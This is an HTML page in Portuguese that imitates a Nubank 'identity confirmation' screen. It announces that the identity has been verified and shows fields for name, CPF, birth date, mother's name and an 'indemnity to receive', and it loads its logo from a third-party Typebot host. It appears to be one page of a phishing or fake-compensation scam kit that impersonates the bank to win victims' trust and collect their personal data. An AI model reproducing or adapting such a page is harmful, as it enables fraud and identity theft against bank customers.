
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Confirmação de Identidade - Nubank</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="style.css">
</head>
<body>
<div class="container">
  <img src="https://s3.typebot.io/public/workspaces/clz0evci800182fdgujoh8p5r/typebots/cmacusg2n001410ck8g0fvm4l/blocks/kxnrtvipfifqbbh1o0ebi7tr?v=1746675454858" alt="Nubank" class="logo">
  <hr class="divider">

  <div class="success-message">
    Sua identidade foi confirmada com sucesso! Confira abaixo as informações cadastradas.
  </div>

  <div class="info-card">
    <div class="label">Nome completo</div>
    <div class="value" id="nome"></div>
  </div>

  <div class="info-card">
    <div class="label">CPF</div>
    <div class="value" id="cpf"></div>
  </div>

  <div class="info-card">
    <div class="label">Data de Nascimento</div>
    <div class="value" id="nasc"></div>
  </div>

  <div class="info-card">
    <div class="label">Nome da Mãe</div>
    <div class="value" id="mae"></div>
  </div>

  <div class="info-card">
    <div class="label">Indenização a receber</div>
    <div class="value" id="valor"></div>
  </div>

  <hr class="divider">

  <div class="footer-verificacao">
    Sistema de Verificação - Nubank<br>
    Santa Catarina
  </div>

</div>
<script src="script.js"></script>
</body>
</html>
